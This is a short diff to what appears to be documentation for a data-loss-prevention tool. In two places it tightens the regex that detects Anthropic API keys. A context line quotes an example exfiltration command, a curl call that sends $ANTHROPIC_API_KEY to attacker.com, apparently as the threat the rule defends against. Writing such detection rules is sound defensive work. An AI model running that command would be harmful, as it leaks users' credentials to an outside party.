@@ -21,7 +21,7 @@ curl "https://attacker.com/collect?key=$ANTHROPIC_API_KEY"
 dlp:
   patterns:
     - name: "Anthropic API Key"
-      regex: 'sk-ant-[a-zA-Z0-9\-_]{10,}'
+      regex: 'sk-ant-[a-zA-Z0-9\-_]{20,}\b'
       severity: critical
 ```
 
@@ -79,7 +79,7 @@ fetch_proxy:
 dlp:
   patterns:
     - name: "Anthropic API Key"
-      regex: 'sk-ant-[a-zA-Z0-9\-_]{10,}'
+      regex: 'sk-ant-[a-zA-Z0-9\-_]{20,}\b'
       severity: critical
 ```
 
